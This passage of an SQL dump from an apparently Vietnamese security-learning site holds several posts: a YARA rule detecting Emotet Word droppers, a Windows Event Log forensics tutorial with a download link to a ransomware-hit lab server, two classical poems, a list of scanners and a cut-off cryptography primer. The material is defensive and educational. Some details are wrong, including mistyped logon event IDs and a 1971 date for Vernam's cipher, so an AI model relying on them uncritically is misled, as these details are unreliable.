dùng​</div></li>\r\n    </ul></div>\r\n    <img src=\"Imageass/c16.png\"><br><br>\r\n    <div class=\"bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code\">\r\n        <div class=\"bbCodeBlock-title\">\r\n            Mã:\r\n        </div>\r\n        <div class=\"bbCodeBlock-content\" dir=\"ltr\">\r\n            <pre class=\"bbCodeCode\" dir=\"ltr\" data-xf-init=\"code-block\" data-lang=\"\"><code>rule Word_Emotet_Dropper : TAU Word Emotet VBA\r\n    {\r\n        meta:\r\n            author = \"Carbon Black TAU\"\r\n            date = \"2017-August-22\"\r\n            description = \"Emotet Word Document Dropper utilizing embedded Comments and Custom Properties Fields\"\r\n            yara_version = \"3.5.0\"\r\n            exemplar_hashes = \"20ca01986dd741cb475dd0312a424cebb53f1201067938269f2e746fb90d7c2e, c7cab605153ac4718af23d87c506e46b8f62ee2bc7e7a3e6140210c0aeb83d48, 3ca148e6d17868544170351c7e0dbef38e58de9435a2f33fe174c83ea9a5a7f5\"\r\n        strings:\r\n            $signature = {D0 CF 11 E0}\r\n            $base = /JAB7w{100,}={0,2}/\r\n            $s1 = \"BuiltInDocumentProperties\"\r\n            $s2 = \"CustomDocumentProperties\"\r\n            $s3 = \"Run\"\r\n            $s4 = \"VBA\"\r\n            $s6 = \"Comments\"\r\n            $s7 = \"autoopen\"\r\n            $s8 = \"Module1\"\r\n            $s9 = \"Picture 1\" wide\r\n            $s10 = \"JFIF\"\r\n        condition:\r\n            $signature at 0 and\r\n            $base in (0x8200..0x9000) and\r\n            8 of ($s*)\r\n    }</code></pre>\r\n        </div>\r\n    </div><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/c17.png\"><br>\r\n    ​</div>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(43, 'Forensic10: Thực hành điều tra server bị tấn công', '', '<div class=\"bbWrapper\">Một ngày nào đó server của công ty bạn bị tấn công. Sếp yêu cầu điều tra nguyên nhân, bạn phải làm sao? Hãy đọc bài của mình nhé<br><br>\r\n    <b>Giới thiệu công cụ EventLog phục vụ điều tra hệ thống</b><br>\r\n    EventLog – nhật ký của Windows, toàn bộ các sự kiện tác động vào hệ thống như đăng nhập đăng xuất, remote desktop, bật tắt máy, cài đặt service... sẽ được ghi lại.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n\r\n        <img src=\"Imageass/upload_2020-1-16_17-26-41.png\">\r\n    </div><br>\r\n    Event Log có 3 phần chính<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\"><b>Windows Logs</b>: Là phần quan trọng nhất, phục vụ chủ yếu cho điều tra.<ul>\r\n    <li data-xf-list-type=\"ul\"><b>Application:</b> Nơi lưu nhật ký các chương trình, phần mềm cài trên máy</li>\r\n    <li data-xf-list-type=\"ul\"><b>Security:</b> Nơi lưu nhật ký liên quan đến bảo mật của máy tính. Như đăng nhập đăng xuất, bật tắt máy...</li>\r\n    <li data-xf-list-type=\"ul\"><b>System:</b> Nơi lưu nhật ký liên quan đến tác động vào hệ thống file của Windows. Như cài đặt, bật tắt service…</li>\r\n    <li data-xf-list-type=\"ul\"><b>Setup:</b> Nơi lưu lại nhật ký cài đặt các bản vá của Windows.</li>\r\n    <li data-xf-list-type=\"ul\"><b>Forwarded events:</b> Nơi lưu nhật ký liên quan đến các máy tính khác trong mạng tác động tới máy tính của bạn.</li>\r\n    </ul></li>\r\n    <li data-xf-list-type=\"ul\"><b>Application and Services Logs:</b> Nơi lưu lại nhật ký liên quan đến các chương trình, phần mềm của Windows hoặc của các chương, trình phần mềm đăng ký với Windows để ghi lại nhật ký.</li>\r\n    <li data-xf-list-type=\"ul\"><b>Custom View:</b> Bạn chỉ quan tâm đến một số sự kiện, bạn có thể vào phần này để cấu hình.</li>\r\n    </ul>Vị trí lưu file của Event log “%SystemRoot%System32WinevtLogs”. Kích thước tối đa của mỗi file là 20MB, khi file log quá giới hạn các bản ghi cũ sẽ bị xóa bỏ. Tùy thuộc vào mục đích chúng ta có thể cấu hình tăng kích thước này lên.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/upload_2020-1-16_17-27-32.png\">\r\n    </div><br>\r\n    <b>Các event đặc biệt phục vụ quá trình điều tra<br>\r\n    Lịch sử Remote Desktop(Event ID = 1149)</b><br><br>\r\n    Truy cập vào <i>Application and Service LogsMicrosoftWindowsTerminalServices-RemoteConnectionManagerOperational</i> lọc tìm các event mã 1149 để xem lịch sử remote desktop, từ đây chúng ta có thể thấy được rất nhiều thông tin hưu ích như: Địa chỉ IP, User, Domain, thời điểm remote vào server.<br>\r\n    Trong ví dụ bên dưới thấy được: Máy tính bị remote thông qua Administrator bằng máy có tên Gaara-PC, IP 30.x.x.174 vào lúc 10:08:14 PM ngày 15/01/2020.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/upload_2020-1-16_17-28-11.png\">\r\n    </div><br>\r\n    <b>Lịch sử shutdown, restart máy (EventID = 1074)</b><br><br>\r\n    Truy cập vào <i>Windows LogsSystem</i> lọc tìm các event có mã 1074 để xem lịch sử bật tắt máy. Từ ví dụ bên dưới thấy được: Máy tính bị restart lúc 10:20:19 PM ngày 15/01/2020.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/upload_2020-1-16_17-28-31.png\">\r\n    </div><br><br>\r\n    <b>Lịch sử đăng nhập, đăng xuất(EventID = 4624, 4634, 4676)</b><br><br>\r\n    Truy cập vào <i>Windows LogsSecurity </i>lọc tìm mã 4024(logon), 4034(logoff), 4676(xác thực) để xem lịch sử đăng nhập đăng xuất.<br>\r\n    Từ ví dụ bên dưới ta thấy được: Thời điểm đăng nhập, đăng xuất, thành công hay thất bại, IP… Log này rất hưu ích cho việc tìm tấn công brute force. Thật vậy tấn công brute force hacker sẽ thử một tập mật khẩu yếu với tần suất liên tục, dựa vào đặc điểm này rất dễ nhận biết trên log nếu một máy (IP) đăng nhập thất bại nhiều lần liên tục.<br>\r\n    <br>\r\n    <div style=\"text-align:center\">\r\n        <img src=\"Imageass/upload_2020-1-16_17-28-59.png\">\r\n    </div><br>\r\n    <b>Lịch sử cài đặt service (Event ID = 7045)</b><br><br>\r\n    Truy cập vào <i>Windows LogsSystem</i> lọc tìm mã 7045 để xem lịch sử cài đặt service. Từ ví dụ bên dưới thấy được: Service GoogleUpdate được cài đặt vào lúc 1:49:14 PM ngày 16/1/2020.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/upload_2020-1-16_17-29-14.png\">\r\n    </div><br>\r\n    Trên là các mã event quan trọng phục vụ quá trình điều tra, ngoài ra còn một số event khác như: Tạo username, bật tắt cấu hình firewall, bật tắt UAC...Các bạn có thểm tìm hiểu thêm nhé.<br>\r\n    <br><br><br>\r\n    <b>Thực hành điều tra nguyên nhân server bị tấn công</b><br><br>\r\n    Yêu cầu: Có một server bị mã hóa, toàn bộ dữ liệu quan trọng bị mã hóa hết. Sếp yêu cần tìm ra nguyên nhân và đưa ra phương án phòng tránh.<br>\r\n    Các bạn tải file clone server về import vào VirtualVox để thực hành nhé.<br><br>\r\n    Link tải: <a href=\"https://drive.google.com/file/d/1iMFR-bHGVu7W8yv9zjcf1Zp1z5Cng7M2/view?usp=sharing\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1iMFR-bHGVu7W8yv9zjcf1Zp1z5Cng7M2%2Fview%3Fusp%3Dsharing&amp;hash=dc6ebc65f1d12787532b2f5e706b78f2\" rel=\"nofollow ugc noopener\">https://drive.google.com/file/d/1iMFR-bHGVu7W8yv9zjcf1Zp1z5Cng7M2/view?usp=sharing</a>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(44, 'Nam quốc sơn hà -- Lý Thường Kiệt --', '', 'Nam quốc sơn hà Nam đế cư,<br><br>\r\nTiệt nhiên định phận tại thiên thư.<br><br>\r\nNhư hà nghịch lỗ lai xâm phạm,<br><br>\r\nNhữ đẳng hành khan thủ bại hư.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(45, 'Bình Ngô Đại Cáo -- Nguyễn Trãi --', '', 'Từng nghe:<br><br>\r\nViệc nhân nghĩa cốt ở yên dân,<br><br>\r\nQuân điếu phạt trước lo trừ bạo;<br><br>\r\nNhư nước Đại Việt ta từ trước,<br><br>\r\nVốn xưng nền văn hiến đã lâu,<br><br>\r\nNúi sông bờ cỏi đã chia,<br><br>\r\nPhong tục Bắc Nam cũng khác;<br><br>\r\nTừ Triệu, Đinh, Lý, Trần bao đời xây nền độc lập<br><br>\r\nCùng Hán, Đường, Tống, Nguyên mỗi bên hùng cứ một phương;<br><br>\r\nTuy mạnh yếu có lúc khác nhau,<br><br>\r\nSong hào kiệt thời nào cũng có.<br><br>\r\nCho nên:<br><br>\r\nLưu Cung tham công nên thất bại;<br><br>\r\nTriệu Tiết thích lớn phải tiêu vong;<br><br>\r\nCửa Hàm Tử bắt sống Toa Đô<br><br>\r\nSông Bạch Đằng giết tươi Ô Mã<br><br>\r\nViệc xưa xem xét, chứng cứ còn ghi.<br><br>\r\n\r\nVừa rồi:<br><br>\r\nNhân họ Hồ chính sự phiền hà<br><br>\r\nĐể trong nước lòng dân oán hận<br><br>\r\nQuân cuồng Minh thừa cơ gây hoạ<br><br>\r\nBọn gian tà còn bán nước cầu vinh<br><br>\r\nNướng dân đen trên ngọn lửa hung tàn<br><br>\r\nVùi con đỏ xuống dưới hầm tai vạ<br><br>\r\nDối trời lừa dân đủ muôn ngàn kế<br><br>\r\nGây thù kết oán trải mấy mươi năm<br><br>\r\nBại nhân nghĩa nát cả đất trời.<br><br>\r\nNặng thuế khoá sạch không đầm núi.<br><br>\r\nNgười bị ép xuống biển dòng lưng mò ngọc, ngán thay cá mập thuồng luồng.<br><br>\r\nKẻ bị đem vào núi đãi cát tìm vàng, khốn nỗi rừng sâu nước độc.<br><br>\r\nVét sản vật, bắt dò chim trả, chốn chốn lưới chăng.<br><br>\r\nNhiễu nhân dân, bắt bẫy hươu đen, nơi nơi cạm đặt.<br><br>\r\nTàn hại cả giống côn trùng cây cỏ,<br><br>\r\nNheo nhóc thay kẻ goá bụa khốn cùng.<br><br>\r\nThằng há miệng, đứa nhe răng, máu mỡ bấy no nê chưa chán,<br><br>\r\nNay xây nhà, mai đắp đất, chân tay nào phục dịch cho vừa?<br><br>\r\nNặng nề những nổi phu phen<br><br>\r\nTan tác cả nghề canh cửi.<br><br>\r\nĐộc ác thay, trúc Nam Sơn không ghi hết tội,<br><br>\r\nDơ bẩn thay, nước Đông Hải không rửa sạch mùi!<br><br>\r\nLẽ nào trời đất dung tha? Ai bảo thần dân chịu được?<br><br>\r\n\r\nTa đây:<br><br>\r\nNúi Lam sơn dấy nghĩa<br><br>\r\nChốn hoang dã nương mình<br><br>\r\nNgẫm thù lớn há đội trời chung<br><br>\r\nCăm giặc nước thề không cùng sống<br><br>\r\nĐau lòng nhức óc, chốc đà mười mấy năm trời<br><br>\r\nNếm mật nằm gai, há phải một hai sớm tối.<br><br>\r\nQuên ăn vì giận, sách lược thao suy xét đã tinh,<br><br>\r\nNgẫm trước đến nay, lẽ hưng phế đắn đo càng kỹ.<br><br>\r\nNhững trằn trọc trong cơn mộng mị,<br><br>\r\nChỉ băn khoăn một nỗi đồ hồi<br><br>\r\nVừa khi cờ nghĩa dấy lên,<br><br>\r\nChính lúc quân thù đang mạnh.<br><br>\r\n\r\nLại ngặt vì:<br><br>\r\nTuấn kiệt như sao buổi sớm,<br><br>\r\nNhân tài như lá mùa thu,<br><br>\r\nViệc bôn tẩu thiếu kẻ đở đần,<br><br>\r\nNơi duy ác hiếm người bàn bạc,<br><br>\r\nTấm lòng cứu nước, vẫn đăm đăm muốn tiến về đông,<br><br>\r\nCỗ xe cầu hiền, thường chăm chắm còn dành phía tả.<br><br>\r\n\r\nThế mà:<br><br>\r\nTrông người, người càng vắng bóng, mịt mù như nhìn chốn bể khơi.<br><br>\r\nTự ta, ta phải dốc lòng, vội vã hơn cứu người chết đuối.<br><br>\r\nPhần vì giận quân thù ngang dọc,<br><br>\r\nPhần vì lo vận nước khó khăn,<br><br>\r\nKhi Linh Sơn lương hết mấy tuần,<br><br>\r\nLúc Khôi Huyện quân không một đội.<br><br>\r\nTrời thử lòng trao cho mệnh lớn<br><br>\r\nTa gắng trí khắc phục gian nan.<br><br>\r\nNhân dân bốn cỏi một nhà, dựng cần trúc ngọn cờ phấp phới<br><br>\r\nTướng sĩ một lòng phụ tử, hoà nước sông chén rượu ngọt ngào.<br><br>\r\nThế trận xuất kỳ, lấy yếu chống mạnh,<br><br>\r\nDùng quân mai phục, lấy ít địch nhiều.<br><br>\r\n\r\nTrọn hay:<br><br>\r\nĐem đại nghĩa để thắng hung tàn,<br><br>\r\nLấy chí nhân để thay cường bạo.<br><br>\r\nTrận Bồ Đằng sấm vang chớp giật,<br><br>\r\nMiền Trà Lân trúc chẻ tro bay.<br><br>\r\nSĩ khí đã hăng<br><br>\r\nQuân thanh càng mạnh.<br><br>\r\nTrần Trí, Sơn Thọ nghe hơi mà mất vía,<br><br>\r\nLý An, Phương Chính, nín thở cầu thoát thân.<br><br>\r\nThừa thắng đuổi dài, Tây Kinh quân ta chiếm lại,<br><br>\r\nTuyển binh tiến đánh, Đông Đô đất cũ thu về.<br><br>\r\nNinh Kiều máu chảy thành sông, tanh trôi vạn dặm<br><br>\r\nTốt Động thây chất đầy nội, nhơ để ngàn năm.<br><br>\r\nPhúc tâm quân giặc: Trần Hiệp đã phải bêu đầu<br><br>\r\nMọt gian kẻ thù: Lý Lượng cũng đành bỏ mạng.<br><br>\r\nVương Thông gỡ thế nguy, mà đám lửa cháy lại càng cháy<br><br>\r\nMã Anh cứu trận đánh mà quân ta hăng lại càng hăng.<br><br>\r\nBó tay để đợi bại vong, giặc đã trí cùng lực kiệt,<br><br>\r\nChẳng đánh mà người chịu khuất, ta đây mưu phạt tâm công.<br><br>\r\nNgờ đâu vẫn đương mưu tính lại còn chuốc tội gây oan.<br><br>\r\nGiữ ý kiến một người, gieo vạ cho bao nhiêu kẻ khác,<br><br>\r\nTham công danh một lúc, để cười cho tất cả thế gian.<br><br>\r\n\r\nBởi thế:<br><br>\r\nThằng nhãi con Tuyên Đức động binh không ngừng<br><br>\r\nĐồ nhút nhát Thạnh, Thăng đem dầu chữa cháy<br><br>\r\nĐinh mùi tháng chín, Liễu Thăng đem binh từ Khâu Ôn kéo lại<br><br>\r\nNăm ấy tháng mười, Mộc Thạnh chia đường từ Vân Nam tiến sang.<br><br>\r\nTa trước đã điều binh thủ hiểm, chặt mũi tiên phong<br><br>\r\nSau lại sai tướng chẹn đường, tuyệt nguồn lương thực<br><br>\r\nNgày mười tháng tám, trận Chi Lăng, Liễu Thăng thất thế<br><br>\r\nNgày hai mươi, trận Mã Yên, Liễu Thăng cụt đầu<br><br>\r\nNgày hăm lăm, bá tước Lương Minh đại bại tử vong<br><br>\r\nNgày hăm tám, thượng thư Lý Khánh cùng kế tự vẫn.<br><br>\r\nThuận đà ta đưa lưỡi dao tung phá<br><br>\r\nBí nước giặc quay mũi giáo đánh nhau<br><br>\r\nLại thêm quân bốn mặt vây thành<br><br>\r\nHẹn đến giữa tháng mười diệt giặc<br><br>\r\nSĩ tốt kén người hùng hổ<br><br>\r\nBề tôi chọn kẻ vuốt nanh<br><br>\r\nGươm mài đá, đá núi cũng mòn<br><br>\r\nVoi uống nước, nước sông phải cạn.<br><br>\r\nĐánh một trận, sạch không kình ngạc<br><br>\r\nĐánh hai trận tan tác chim muông.<br><br>\r\nCơn gió to trút sạch lá khô,<br><br>\r\nTổ kiến hổng sụt toang đê vỡ.<br><br>\r\nĐô đốc Thôi Tụ lê gối dâng tờ tạ tội,<br><br>\r\nThượng thư Hoàng Phúc trói tay để tự xin hàng.<br><br>\r\nLạng Giang, Lạng Sơn, thây chất đầy đường<br><br>\r\nXương Giang, Bình Than, máu trôi đỏ nước<br><br>\r\nGhê gớm thay! Sắc phong vân phải đổi,<br><br>\r\nThảm đạm thay! Ánh nhật nguyệt phải mờ<br><br>\r\nBị ta chặn ở Lê Hoa, quân Vân Nam nghi ngờ khiếp vía mà vỡ mật!<br><br>\r\nNghe Thăng thua ở Cần Trạm, quân Mộc Thạnh xéo lên nhau chạy để thoát thân.<br><br>\r\nSuối Lãnh Câu, máu chảy trôi chày, nước sông nghẹn ngào tiếng khóc<br><br>\r\nThành Đan Xá, thây chất thành núi, cỏ nội đầm đìa máu đen.<br><br>\r\nCứu binh hai đạo tan tành, quay gót chẳng kịp,<br><br>\r\nQuân giặc các thành khốn đốn, cởi giáp ra hàng<br><br>\r\nTướng giặc bị cầm tù, như hổ đói vẫy đuôi xin cứu mạng<br><br>\r\nThần vũ chẳng giết hại, thể lòng trời ta mở đường hiếu sinh<br><br>\r\nMã Kỳ, Phương Chính, cấp cho năm trăm chiếc thuyền, ra đến biển mà vẫn hồn bay phách lạc,<br><br>\r\nVương Thông, Mã Anh, phát cho vài nghìn cỗ ngựa, về đến nước mà vẫn tim đập chân run.<br><br>\r\nHọ đã tham sống sợ chết mà hoà hiếu thực lòng<br><br>\r\nTa lấy toàn quân là hơn, để nhân dân nghỉ sức.<br><br>\r\nChẳng những mưu kế kì diệu<br><br>\r\nCũng là chưa thấy xưa nay<br><br>\r\nXã tắc từ đây vững bền<br><br>\r\nGiang sơn từ đây đổi mới<br><br>\r\nCàn khôn bĩ rồi lại thái<br><br>\r\nNhật nguyệt hối rồi lại minh<br><br>\r\nNgàn năm vết nhục nhã sạch làu<br><br>\r\nMuôn thuở nền thái bình vững chắc<br><br>\r\nÂu cũng nhờ trời đất tổ tông linh thiêng đã lặng thầm phù trợ;<br><br>\r\n\r\nThan ôi!<br><br>\r\nMột cỗ nhung y chiến thắng,<br><br>\r\nNên công oanh liệt ngàn năm<br><br>\r\nBốn phương biển cả thanh bình,<br><br>\r\nBan chiếu duy tân khắp chốn.<br><br>\r\n\r\nXa gần bá cáo,<br><br>\r\nAi nấy đều hay.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(46, 'công cụ phân tích lỗ hổng', '', '1. httpX-httpx là bộ công cụ HTTP nhanh và đa năng cho phép chạy nhiều đầu dò bằng thư viện retryablehttp<br>\r\nhttps://github.com/projectdiscovery/httpx<br><br>\r\n2.Struts-Scan là công cụ phát hiện lỗ hổng và sử dụng Struts2.<br>\r\nhttps://github.com/Lucifer1993/struts-scan<br><br>\r\n3.Nikto là một máy quét máy chủ web nguồn mở (GPL) thực hiện các bài kiểm tra toàn diện đối với máy chủ web cho nhiều mục<br>\r\nhttps://github.com/sullo/nikto<br><br>\r\n4.W3af là khung tấn công và kiểm toán ứng dụng web, máy quét lỗ hổng web nguồn mở<br>\r\nhttps://github.com/andresriancho/w3af/<br><br>\r\n5.Openvas là máy quét và quản lý lỗ hổng Open Source tiên tiến nhất thế giới.<br>\r\nhttp://ww.openvas.org/<br>', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(47, 'Crypto1: Hệ thống mật mã - Phần 1', '', 'CRYPTOGRAPHIC SYSTEMS (HỆ THỐNG MẬT MÃ) – Part 1<br><br>\r\n<div class=\"bbWrapper\">Trong phạm vi cục bộ, để bảo đảm an toàn cho hạ tầng mạng và thiết bị đầu cuối, chúng ta có thể dùng kết hợp nhiều tính năng, như: gia cường thiết bị (<i>device hardening)</i>, điều khiển truy nhập <i>(AAA access control)</i>, tường lửa <i>(firewall)</i>, và triển khai hệ thống IPS. Nhưng <i>data</i> sẽ được bảo vệ như thế nào khi truyền qua mạng <i>Internet</i> công cộng ? Câu trả lời là \"sử dụng kỹ thuật mật mã\".<br><br>\r\n    Việc truyền thông an toàn có một yêu cầu là phải đảm bảo <i>data</i> không bị giả mạo, không bị thay đổi và gửi từ một nguồn tin cậy có chứng minh. Thêm nữa, nếu <i>data</i> bị đánh cắp thì không thể giải mã.<br><br>\r\n    Nhiều hệ thống mạng hiện đại đảm bảo tính xác thực <i>(authentication)</i> với các giao thức như HMAC; đảm bảo tính toàn vẹn <i>(integrity)</i> bằng các thuật toán hàm băm <i>(hash function)</i> như MD, SHA; đảm bảo tính bí mật của dữ liệu bằng các thuật toán mã hóa đối xứng như DES, 3DES, AES, hoặc thuật toán mã hóa bất đối xứng như RSA và PKI.<br><br>\r\n    Nhằm chuẩn bị kiến thức phục vụ cho các chuyên đề về VPN tiếp theo, loạt bài viết này sẽ trình bày một cách căn bản về mật mã học, bao gồm các nội dung chính như sau:<br><br>\r\n    -       <i>Cryptographic Services</i> (Dịch vụ mật mã)<br>\r\n    -       <i>Integrity and Authenticity</i> (Tính xác thực và Toàn vẹn)<br>\r\n    -       <i>Confidentiality</i> (Mã hóa)<br>\r\n    -       <i>Public Key Cryptography</i> (Mật mã khóa công khai)<br><br>\r\n    Các thuật ngữ sử dụng trong bài viết:<br>\r\n    <i>1.Cryptology: ngành khoa học làm ra và phân tích (giải) các đoạn mã bí mật <br>\r\n    2.Cryptography: mật mã học (phát triển và sử dụng mật mã)<br>\r\n    3.Cryptanalysis: phân tích mật mã<br>\r\n    4.Secret codes: mã bí mật</i><br>\r\n    5.<i>Authentication: tính xác thực</i><br>\r\n    6.<i>Integrity: tính toàn vẹn</i><br>\r\n    7.<i>Confidentiality: tính bí mật</i><br>\r\n    8.<i>Nonrepudiation: tính không chối bỏ<br>\r\n    9.Transposition: hoán vị<br>\r\n    10.Substitution: thay thế</i><br>\r\n    11.  <i>Plaintext/Cleartext: dữ liệu gốc chưa mã hóa (bản rõ)</i><br>\r\n    12.  <i>Ciphertext: dữ liệu đã mã hóa (bản mã)</i><br>\r\n    13.  <i>Cipher: thuật toán/phép mã hóa</i><br>\r\n    14.  <i>Key: khóa</i><br>\r\n    15.  <i>Shared secret key: khóa bí mật được chia sẻ trước</i><br><br>\r\n    <b>PART 1 – CRYPTOGRAPHIC SERVICES</b><br><br>\r\n    Phần 1 gồm có:<br>\r\n    -       Truyền thông an toàn<br>\r\n    -       Mật mã học<br>\r\n    -       Phân tích mật mã<br><br>\r\n    <b>1.Truyền thông an toàn</b><br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.1.jpg\">\r\n    </div><br>\r\n    Nhiệm vụ của nhà quản trị mạng là đảm bảo an toàn cho hạ tầng mạng (bao gồm các thiết bị <i>router, switch, server, host)</i> và đảm bảo dữ liệu được truyền an toàn trong phạm vị nội bộ cũng như ra bên ngoài.<br><br>\r\n    Có 3 yêu cầu sau đối với việc truyền thông an toàn:<br><br>\r\n    -<i>Authentication (tính xác thực)</i>: đảm bảo rằng dữ liệu không bị giả mạo và được gửi từ một nguồn có thể chứng minh. Ví dụ: việc sử dụng mã cá nhân PIN trong giao dịch tại ngân hàng.<br><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/148993994420150721.1.2.png\">\r\n    </div><br>\r\n    Chú ý sự khác nhau giữa “tính không chối bỏ” <i>(nonrepudiation)</i> với “tính xác thực”. Với dịch vụ <i>nonrepudation</i>, người gửi được xác định là duy nhất, kèm theo những đặc điểm riêng đính kèm theo dữ liệu và do đó không thể chối bỏ vai trò là nguồn truyền tin. Một ví dụ để phân biệt “tính xác thực” và “tính không chối bỏ” là sự trao đổi dữ liệu giữa 2 máy tính trong cùng công ty khác với sự trao đổi dữ liệu giữa một khách hàng với một <i>e-commerce website</i>. Trong cùng công ty, 2 máy tính khi trao đổi dữ liệu với nhau thì không cần các tham số chứng minh là nguồn truyền tin. Các bạn sẽ gặp lại tính chất <i>nonrepudiation</i> trong phần triển khai VPN với CA.<br>\r\n    <br>\r\n    -<i>Integrity (tính toàn vẹn)</i>: tương tự như chức năng <i>checksum</i> trong đóng gói dữ liệu, đảm bảo dữ liệu không bị thay thế và sửa đổi. Ví dụ: việc gắn sáp lên phong bì thư.<br>\r\n    <img src=\"Imageass/148993994420150721.1.3.png\">\r\n    <br><br>\r\n    - <i>Confidentiality (tính bí mật)</i>: đảm bảo rằng chỉ người nhận mới có thể đọc được dữ liệu và kẻ đánh cắp thì không giải mã được. Ví dụ: phương pháp mã hóa của <i>Julius Caesar</i> thực với nguyên tắc là chuyển vị trí các phần tử trong bảng chữ cái.<br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.3.1.png\">\r\n    </div><br>\r\n    <b>2. Mật mã học</b><br>\r\n    <i>Authentication, integrity</i>, và <i>confidentiality</i> là các thành phần của mật mã học. Các thuật toán đặc biệt (còn gọi là <i>cipher</i>) được sử dụng để mã hóa và giải mã dữ liệu. Những phương pháp dùng để tạo ra dữ liệu được mã hóa <i>(ciphertext)</i> gồm có:<br>\r\n    -       <i>Transposition (hoán vị)</i><br>\r\n    -       <i>Substitution (thay thế)</i><br>\r\n    -       <i>Vernam</i><br><br>\r\n    2.1.  <i>Transposition</i><br>\r\n    Khi sử dụng thuật toán hoán vị, các chữ cái không bị thay thế mà đơn giản là chúng bị sắp xếp lại. Ví dụ: dữ liệu gốc <i>(plaintext, cleartext)</i> là “<i>FLANK EAST ATTACK AT DAWN</i>” được mã hóa thành “<i>NWAD TAKCATTA TSAE KNALF</i>”. Trong ví dụ này, chìa khóa <i>(key)</i> là đảo ngược ký tự.<br><br>\r\n    Một ví dụ khác là thuật toán <i>“rail fence”</i>. Trong ví dụ này, <i>key</i>=3, nghĩa là dùng 3 đường thẳng khi thực hiện mã hóa. Chúng ta đọc văn bản theo đường chéo lên xuống, như sau:<br>\r\n    <b>F...K...T...A...T...N.<br>\r\n    .L.N.E.S.A.T.C.A.D.W..<br>\r\n    ..A...A...T...K...A...</b><br>\r\n    <div style=\"text-align: center\">\r\n            <img src=\"Imageass/148993994420150721.1.4.png\">\r\n    </div>Một số thuật toán mã hóa hiện đại, như DES và 3DES vẫn kết hợp sử dụng phương pháp hoán vị.<br><br>\r\n    2.2.  <i>Substitution</i><br><br>\r\n    Ý tưởng của thuật toán là thay thế một ký tự này bằng một ký tự khác. Trong kiểu đơn giản nhất, thuật toán vẫn giữ nguyên trật tự của dữ liệu gốc.<br><br>\r\n    Ví dụ 1: <i>Caesar cipher</i><br>\r\n    Với <i>key=3,</i> ký tự D sẽ thay thế cho ký tự A, E thay cho B …<br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.5.png\">\r\n    </div><br>\r\n    Thuật toán <i>Caesar</i> dễ bị giải mã vì toàn bộ dữ liệu được mã hóa với cùng một <i>key shift</i>.<br>\r\n    Ví dụ 2: <i>Vigenere cipher</i><br><br>\r\n    Thuật toán này dựa trên <i>Caesar cipher</i>, ngoại trừ việc sử dụng các <i>key shift</i> khác nhau. Các <i>shift key</i> này được xác định nhờ <i>shared secret key</i> (đã thống nhất trước giữa bên truyền và nhận). Dưới đây là <i>Vigenere Cipher Table.</i><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/148993994420150721.1.6.png\">\r\n    </div><br>\r\n    Giả sử <i>shared secret key</i> là: <b>SECRETKEY</b>. Bên truyền sẽ sử dụng <i>key</i> này để mã hóa <i>plaintext “FLANK EAST ATTACK AT DAWN”</i>, như sau:<br><br>\r\n    -       Chữ F trong từ “<b>F</b>LANK” được mã hóa bằng ký tự X tại giao điểm của cột F và hàng S (<b>S</b>ECRETKEY)<br>\r\n    -       L (F<b>L</b>ANK) được mã hóa bằng P tại giao điểm của cột L và hàng E (S<b>E</b>CRETKEY)<br>\r\n    -       A (FL<b>A</b>NK) được mã hóa bằng C tại giao điểm của cột A và hàng C (SE<b>C</b>RETKEY)<br>\r\n    -       N (FLA<b>N</b>K) được mã hóa bằng E tại giao điểm của cột N và hàng R (SEC<b>R</b>ETKEY)<br>\r\n    -       K (FLAN<b>K</b>) được mã hóa bằng O tại giao điểm của cột K và hàng E (SECR<b>E</b>TKEY)<br><br>\r\n    Và tiếp tục cho phần còn lại của dữ liệu. Khi sử dụng <i>Vigenere cipher</i>, nếu <i>message </i>dài hơn <i>key</i>, thì <i>key</i> sẽ dùng lặp lại. Ví dụ: SECRETKEYSECRETKEYSEC được sử dụng để mã hóa “FLANK EAST ATTACK AT DAWN”, như sau:<br><br>\r\n    <i>Secret key</i><b>: SECRE TKEY SECRET KE YSEC</b><br>\r\n    <i>Plaintext</i><b>: FLANK EAST ATTACK AT DAWN</b><br>\r\n    <i>Cipher text</i><b>: XPCEO XKUR SXVRGD KX BSAP</b><br><br>\r\n    <i>Note: thuật toán này vẫn có thể crack</i>.<br><br>\r\n    <i>2.3. Vernam<br>\r\n    Gilbert Vernam</i> là một kỹ sư làm việc tại phòng nghiên cứu AT&amp;T Bell. Năm 1971, ông đã phát minh ra <i>stream cipher</i> và đồng phát minh ra thuật toán <b><i>one-time pad</i></b> (OTP).  Về lý thuyết, OTP là thuật toán duy nhất chứng minh được là không thể <i>crack,</i> ngay cả với tài nguyên vô tận (do đó có thể chống lại <i>brute-force attack</i>). Để đạt mức độ bảo mật, tất cả những điều kiện sau phải được thỏa mãn:<br><br>\r\n    – Độ dài của khóa phải đúng bằng độ dài văn bản cần mã hóa.<br>\r\n    – Khóa chỉ được dùng một lần.<br>\r\n    – Khóa phải là một số ngẫu nhiên thực.<br><br>\r\n    <b>3.Phân tích mật mã</b><br>\r\n    Phân tích mật mã nhằm xác định ý nghĩa của thông tin đã được mã hóa <i>(cracking the code)</i> mà không cần đến <i>shared secret key</i>.<br><br>\r\n    <i>Cryptanalysis </i>sử dụng một số phương pháp 